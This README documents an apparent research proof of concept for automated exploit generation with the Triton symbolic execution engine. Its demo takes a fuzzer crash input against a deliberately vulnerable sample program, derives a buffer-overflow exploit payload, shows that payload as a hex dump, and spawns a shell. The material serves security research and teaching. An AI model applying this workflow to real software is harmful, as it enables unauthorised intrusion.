Wasabi AEG
====

This is yet another implementation of AEG (Automated Exploit Generation) using symbolic execution engine Triton, and just proof of concept.

This project is inspired by following researches.

* [AEG (Automatic Exploit Generation)](http://security.ece.cmu.edu/aeg/)
* [Driller](https://github.com/shellphish/driller)


Presentations
-----
* Girls Meets Symbolic Execution: Assertion 2. Automated Exploit Generation (at 第14回カーネル／VM探検隊) [[Japanese](https://speakerdeck.com/katc/girls-meets-symbolic-execution-assertion-2-automated-exploit-generation), [English](https://speakerdeck.com/katc/girls-meets-symbolic-execution-assertion-2-automated-exploit-generation-english)]


Requirements
-----
* [Triton](https://github.com/JonathanSalwan/Triton) and [Pin tracer](https://triton.quarkslab.com/documentation/doxygen/index.html#libpintool_install_sec)
    * **NOTE**: My Triton build number is 1380 (v 0.6). Triton's API is volatile. So you may need some patches for solver script in the future.
* [lief](https://lief.quarkslab.com/)
* Python2


Build
----
You must build sample vulnerable programs.

```
cd vuln-samples
make
cd -
```


Demo
-----
Demo applicaitons are located in `vuln-samples`.

### notes
**:tada: Demo video (asciinema) :camera: is avaliable [here](https://asciinema.org/a/oex5uONOiUy5lNb41fgBQALtb)!**

`notes` has buffer overflow bug, and shellcode as `instant_win()` function.

We can obtain crash input using AFL and feed it into `notes`.
We found that `notes` crashes at address `0x7ffff7a8c231`.

```
K_atc% xxd vuln-samples/result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32
00000000: 6ef8 5d69 74e9 6d0d 320a 730a 750a 330a  n.]it.m.2.s.u.3.
00000010: 6e6c 65ff 68ff ff6f 8121 212e 7a81 2121  nle.h..o.!!.z.!!
00000020: 20d5 0a63 6e6e 2120 d50a 636e 6e66 adad   ..cnn! ..cnnf..
00000030: adad 66ad adad adad adad ad22 adad adad  ..f........"....
00000040: adad ad9d adad adad 0d51 0a73 0a75 0a33  .........Q.s.u.3
00000050: 0a6e 6c65 ff28 ffff 6f81 2121 20d5 0a63  .nle.(..o.!! ..c
00000060: 6e6e 6e6e 6e81 e16e 6e6e 6e6e 7e6e 6e6f  nnnnn..nnnnn~nno
00000070: 6e21 ff00 730a 71                        n!..s.q
```

```
gdb-peda$ r < result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32

[----------------------------------registers-----------------------------------]
... snipped ...
RBP: 0xadad9dadadadadad 
... snipped ...
[-------------------------------------code-------------------------------------]
... snipped ...
=> 0x7ffff7a8c231 <__GI__IO_getline_info+193>:  mov    BYTE PTR [rbp+0x0],al
... snipped ...
Stopped reason: SIGBUS
0x00007ffff7a8c231 in __GI__IO_getline_info () from /usr/lib/libc.so.6
```

Generate exploit payload in the following manner.

```
K_atc% export CRASHED_AT=0x7ffff7a8c231

K_atc% time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes.py vuln-samples/notes < vuln-samples/result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32
... snipped ...
[TT] Solving Memory Access constriant...
[TT] Model for Memory Access: {64L: SymVar_64 = 0x60, 65L: SymVar_65 = 0x0, 66L: SymVar_66 = 0x0, 67L: SymVar_67 = 0x0, 68L: SymVar_68 = 0x0, 69L: SymVar_69 = 0x0, 95L: SymVar_95 = 0x10, 62L: SymVar_62 = 0xD8, 63L: SymVar_63 = 0x30}
~~~~~~~~
Found exploitable crash:  'n\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\xf5\nu\x009:n\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\xf5\xf5\xf5\xf5\xf5\xf5\n\xf8\x00n\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xd80`\x00\x00\x00\x00\x00\xf5\xf5\xf5\xf5\n\xf5\nu\x001:\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\x10'
Crash inputs: 'n\xf8]it\xe9m\r2\ns\nu\n3\nnle\xffh\xff\xffo\x81!!.z\x81!! \xd5\ncnn! \xd5\ncnnf\xad\xad\xad\xadf\xad\xad\xad\xad\xad\xad\xad\xad"\xad\xad\xd80`\x00\x00\x00\x00\x00\xad\xad\rQ\ns\nu\n3\nnle\xff(\xff\xffo\x81!! \xd5\n\x10'
[TT] Reading remaining stdin...
    read stdin = ''nnnnn\x81\xe1nnnnn~nnon!\xff\x00s\nq''
[TT] crash input is saved as 'crash_inputs'
[TT] Go on to phase 2
~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  106.72s user 5.79s system 99% cpu 1:53.21 total

K_atc% time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes-phase-2.py vuln-samples/notes < crash_inputs
... snipped ...
~~~~~~~~
[TT] Automated Exploit Generation Done. Saving payload as 'exploit-payload'
[TT] Model for Memory Access: {96L: SymVar_96 = 0x12, 97L: SymVar_97 = 0x40, 98L: SymVar_98 = 0x0, 99L: SymVar_99 = 0x0, 100L: SymVar_100 = 0x0, 101L: SymVar_101 = 0x0, 102L: SymVar_102 = 0x0, 95L: SymVar_95 = 0x10}
Crash Inputs: 'n\xf8]it\xe9m\r2\ns\nu\n3\nnle\xffh\xff\xffo\x81!!.z\x81!! \xd5\ncnn! \xd5\ncnnf\xad\xad\xad\xadf\xad\xad\xad\xad\xad\xad\xad\xad"\xad\xad\xd80`\x00\x00\x00\x00\x00\xad\xad\rQ\ns\nu\n3\nnle\xff(\xff\xffo\x81!! \xd5\n\x10\x12@\x00\x00\x00\x00\x00nnnnn~nnon!\xff\x00s\nq'
To test payload: `(cat exploit-payload -) | ./vuln-samples/notes`
[TT] End
~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  69.77s user 6.09s system 99% cpu 1:16.34 total
```

Finally, we got exploit payload to spawn shell which works fine!

```
K_atc% xxd exploit-payload 
00000000: 6ef8 5d69 74e9 6d0d 320a 730a 750a 330a  n.]it.m.2.s.u.3.
00000010: 6e6c 65ff 68ff ff6f 8121 212e 7a81 2121  nle.h..o.!!.z.!!
00000020: 20d5 0a63 6e6e 2120 d50a 636e 6e66 adad   ..cnn! ..cnnf..
00000030: adad 66ad adad adad adad ad22 adad d830  ..f........"...0
00000040: 6000 0000 0000 adad 0d51 0a73 0a75 0a33  `........Q.s.u.3
00000050: 0a6e 6c65 ff28 ffff 6f81 2121 20d5 0a10  .nle.(..o.!! ...
00000060: 1240 0000 0000 006e 6e6e 6e6e 7e6e 6e6f  .@.....nnnnn~nno
00000070: 6e21 ff00 730a 71                        n!..s.q

K_atc% (cat exploit-payload -) | ./vuln-samples/notes
Exploit Me!!

---- [menu] ----

==== [note #3] ====
title: content: Congratz![Enter]
uname -a
Linux K_atc 4.17.2-1-ARCH #1 SMP PREEMPT Sat Jun 16 11:08:59 UTC 2018 x86_64 GNU/Linux
whoami
katc
```